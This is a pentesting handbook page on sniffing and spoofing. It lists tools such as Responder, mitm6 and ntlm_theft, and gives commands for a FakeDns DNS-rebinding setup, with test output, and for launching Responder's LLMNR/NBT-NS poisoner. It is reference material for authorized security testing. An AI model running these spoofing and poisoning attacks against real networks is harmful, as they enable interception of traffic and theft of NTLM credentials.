# Sniffing & Spoofing

- [Resources](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/09_sniffing_%26_spoofing.md#Resources)

## Table of Contents

- [FakeDns](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/09_sniffing_%26_spoofing.md#FakeDns)
- [Responder](https://github.com/0xsyr0/Awesome-Cybersecurity-Handbooks/blob/main/handbooks/09_sniffing_%26_spoofing.md#Responder)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| mDNS | A mDNS sniffer and interpreter. | https://github.com/eldraco/Sapito |
| mitm6 | mitm6 is a pentesting tool that exploits the default configuration of Windows to take over the default DNS server. | https://github.com/dirkjanm/mitm6 |
| mitmproxy | mitmproxy is an interactive, SSL/TLS-capable intercepting proxy with a console interface for HTTP/1, HTTP/2, and WebSockets. | https://github.com/mitmproxy/mitmproxy |
| ntlm_theft | A tool for generating multiple types of NTLMv2 hash theft files. | https://github.com/Greenwolf/ntlm_theft |
| Responder | IPv6/IPv4 LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay. | https://github.com/lgandx/Responder |

## FakeDns

> https://github.com/Crypt0s/FakeDns

### DNS Rebind Attack

```c
$ cat fake.conf
A <DOMAIN> 127.0.0.1 1%<LHOST>
```

#### Start the Server

```c
$ sudo python3 fakedns.py -c fake.conf --rebind
```

#### Test

```c
nslookup > server <LHOST>
Default server: <LHOST>
Address: <LHOST>#53
> <FAKE_DOMAIN>
Server:         <LHOST>
Address:        <LHOST>#53

Name:   <FAKE_DOMAIN>
Address: 127.0.0.1
*## server can't find <FAKE_DOMAIN>: NXDOMAIN
> <FAKE_DOMAIN>
Server:         <LHOST>
Address:        <LHOST>#53

Name:   <FAKE_DOMAIN>
Address: <LHOST>
*## server can't find <FAKE_DOMAIN>: NXDOMAIN
>
```

## Responder

> https://github.com/lgandx/Responder

```c
$ sudo responder -I <INTERFACE>
```
